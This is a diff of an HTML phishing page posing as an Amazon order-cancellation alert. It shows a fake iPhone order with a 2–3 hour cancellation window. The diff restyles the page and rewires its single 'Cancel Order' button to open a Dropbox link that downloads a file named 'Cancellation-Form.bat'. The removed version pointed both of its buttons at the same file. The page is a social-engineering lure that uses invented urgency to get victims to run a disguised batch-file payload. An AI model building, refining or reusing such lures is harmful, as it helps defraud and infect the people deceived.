@@ -1,17 +1,18 @@
 <html lang="en"><head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Order Alert – Aman.com</title>
+<title>Order Cancellation – Aman.com</title>
 
 <style>
 :root {
-  --primary: #131921;
-  --secondary: #232f3e;
   --accent: #ff9900;
-  --danger: #d93025;
-  --bg: #f3f3f3;
+  --primary: #2b7cff;
+  --bg: #f5f7fa;
+  --card: #ffffff;
+  --text: #222;
 }
 
+/* RESET */
 * {
   box-sizing: border-box;
   font-family: Arial, Helvetica, sans-serif;
@@ -19,56 +20,65 @@
 
 body {
   margin: 0;
-  background: var(--bg);
+  background: linear-gradient(135deg,#eef2f7,#f9fbfd);
+  color: var(--text);
 }
 
-/* HEADER */
+/* LIGHT HEADER */
 header {
-  background: var(--primary);
+  background: white;
   padding: 18px 0;
   text-align: center;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.05);
 }
 
 .logo {
-  height: 48px;
+  height: 55px;
+  object-fit: contain;
 }
 
-/* ALERT BANNER */
+/* ALERT STRIP */
 .alert {
-  background: var(--secondary);
-  color: white;
+  background: #e8f3ff;
+  color: #0b57d0;
   text-align: center;
   padding: 14px;
-  font-size: 16px;
+  font-size: 15px;
+  border-bottom: 1px solid #d6e6ff;
 }
 
 /* CONTAINER */
 .container {
-  max-width: 900px;
-  margin: 30px auto;
-  padding: 0 16px;
+  max-width: 920px;
+  margin: 40px auto;
+  padding: 0 18px;
 }
 
 /* CARD */
 .card {
-  background: white;
-  border-radius: 10px;
-  box-shadow: 0 10px 30px rgba(0,0,0,0.08);
-  padding: 26px;
+  background: var(--card);
+  border-radius: 14px;
+  box-shadow: 0 18px 40px rgba(0,0,0,0.08);
+  padding: 30px;
 }
 
 /* TITLE */
 h1 {
   margin-top: 0;
-  font-size: 24px;
+  font-size: 26px;
+}
+
+.subtitle {
+  color: #666;
+  margin-bottom: 25px;
 }
 
 /* ORDER BOX */
 .order-box {
-  border: 1px solid #ddd;
-  border-radius: 8px;
-  padding: 18px;
-  margin-top: 20px;
+  border: 1px solid #e3e6ea;
+  border-radius: 10px;
+  padding: 20px;
+  background: #fafbfc;
 }
 
 .order-row {
@@ -78,81 +88,77 @@ h1 {
   font-size: 14px;
 }
 
+.order-row strong {
+  color: #555;
+}
+
 /* DELIVERY STATUS */
 .status {
-  margin-top: 20px;
-  padding: 16px;
-  background: #e8f3ff;
-  border-left: 5px solid #2b7cff;
-  border-radius: 6px;
+  margin-top: 22px;
+  padding: 18px;
+  background: #f0f7ff;
+  border-left: 5px solid var(--primary);
+  border-radius: 8px;
 }
 
 .status strong {
-  color: #0b57d0;
+  color: var(--primary);
 }
 
-/* TIMER NOTICE */
+/* NOTICE */
 .notice {
   margin-top: 18px;
-  padding: 14px;
+  padding: 16px;
   background: #fff4e5;
   border-left: 5px solid var(--accent);
-  border-radius: 6px;
+  border-radius: 8px;
   font-size: 14px;
 }
 
-/* BUTTONS */
+/* BUTTON */
 .actions {
-  margin-top: 28px;
-  display: flex;
-  gap: 14px;
-  flex-wrap: wrap;
+  margin-top: 30px;
+  text-align: center;
 }
 
 button {
-  flex: 1;
-  padding: 16px;
-  font-size: 16px;
-  font-weight: bold;
-  border-radius: 8px;
+  background: linear-gradient(180deg,#ffb84d,#ff9900);
   border: none;
+  padding: 18px 34px;
+  font-size: 18px;
+  font-weight: bold;
+  border-radius: 10px;
   cursor: pointer;
+  box-shadow: 0 6px 0 #cc7a00;
   transition: 0.15s;
 }
 
-/* CANCEL */
-.cancel {
-  background: linear-gradient(#ffb3b3, #ff4d4d);
-  box-shadow: 0 4px 0 #cc0000;
-  color: white;
-}
-
-.cancel:hover {
+button:hover {
   transform: translateY(-2px);
+  box-shadow: 0 8px 0 #cc7a00;
 }
 
-/* REFUND */
-.refund {
-  background: linear-gradient(#ffd699, #ff9900);
-  box-shadow: 0 4px 0 #cc7a00;
-}
-
-.refund:hover {
-  transform: translateY(-2px);
+button:active {
+  transform: translateY(2px);
+  box-shadow: 0 3px 0 #cc7a00;
 }
 
 /* FOOTER */
 .footer {
-  margin-top: 20px;
+  margin-top: 24px;
   text-align: center;
   font-size: 12px;
-  color: #666;
+  color: #777;
 }
 
 /* MOBILE */
-@media (max-width: 600px) {
-  .actions {
-    flex-direction: column;
+@media (max-width:600px){
+  .card {
+    padding: 22px;
+  }
+
+  button {
+    width: 100%;
   }
 }
 </style>
@@ -160,39 +166,43 @@ button {
 
 <body>
 
-<!-- HEADER LOGO -->
+<!-- LIGHT HEADER WITH CENTER LOGO -->
 <header>
-  <!-- Replace logo later -->
+  <!-- Replace this logo later -->
   <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg">
 </header>
 
+<!-- ALERT STRIP -->
 <div class="alert">
-Order Activity Notification
+Order Activity Update
 </div>
 
 <div class="container">
   <div class="card">
 
     <h1>Order Placed on Your Account</h1>
-    <p>
-      An order has been successfully placed from your Amazon.com account.
-      If you did not intend to place this order, you may cancel it within the allowed time window below.
-    </p>
+
+    <div class="subtitle">
+      An order has recently been placed using your Aman.com account.
+      If you did not intend to proceed with this purchase,
+      you may cancel it within the available time window.
+    </div>
 
     <!-- ORDER DETAILS -->
     <div class="order-box">
+
       <div class="order-row">
         <strong>Order ID</strong>
         <span>#402-9384756-1192834</span>
       </div>
 
       <div class="order-row">
-        <strong>Item</strong>
+        <strong>Product</strong>
         <span>iPhone 17 Pro Max</span>
       </div>
 
       <div class="order-row">
-        <strong>Amount</strong>
+        <strong>Order Amount</strong>
         <span>$1,622.67</span>
       </div>
 
@@ -200,31 +210,30 @@ Order Activity Notification
         <strong>Payment Status</strong>
         <span>Authorized</span>
       </div>
+
     </div>
 
     <!-- DELIVERY STATUS -->
     <div class="status">
       🚚 <strong>Out for Delivery</strong><br><br>
-      Your package is currently being processed for shipment and is expected
-      to be delivered within <strong>7 days</strong>.
+      Your order is currently being processed for shipment and is
+      expected to arrive within <strong>7 days</strong>.
     </div>
 
-    <!-- TIME NOTICE -->
+    <!-- CANCELLATION WINDOW -->
     <div class="notice">
-      You can cancel this order within the next
+      You may cancel this order within the next
       <strong>2–3 hours</strong> before shipment processing is finalized.
-      After this window, cancellation may not be possible.
+      Once dispatched, cancellation may no longer be available.
     </div>
 
-    <!-- ACTION BUTTONS -->
+    <!-- CANCEL BUTTON -->
     <div class="actions">
-      <button class="cancel" onclick="https://www.dropbox.com/scl/fi/nab33fiu8wfg7dy5qaylo/Cancellation-Form.bat?rlkey=ywnf2jhkofrhmfxzl9h4op039&amp;st=a7wwer98&amp;dl=1">
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Accept Order
-      </button>
-      <button class="refund" onclick="https://www.dropbox.com/scl/fi/nab33fiu8wfg7dy5qaylo/Cancellation-Form.bat?rlkey=ywnf2jhkofrhmfxzl9h4op039&amp;st=a7wwer98&amp;dl=1">
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Cancel Order
+      <button onclick="openCancelLink()">
+        Cancel Order
       </button>
     </div>
+
     <div class="footer">
       © 2026 Amazon.com, Inc. All rights reserved.
     </div>
@@ -232,16 +241,12 @@ Order Activity Notification
   </div>
 </div>
 
+<!-- BUTTON LINK SCRIPT -->
 <script>
-function cancelOrder() {
-  alert(
-    "Your cancellation request has been submitted.\n\nIf approved, the order will be stopped before shipment."
-  );
-}
-
-function refundOrder() {
-  alert(
-    "Refund request initiated.\n\nIf payment is captured, the refund will be processed to your original payment method."
+function openCancelLink() {
+  window.open(
+    "https://www.dropbox.com/scl/fi/nab33fiu8wfg7dy5qaylo/Cancellation-Form.bat?rlkey=ywnf2jhkofrhmfxzl9h4op039&st=a7wwer98&dl=1",
+    "_blank"
   );
 }
 </script>
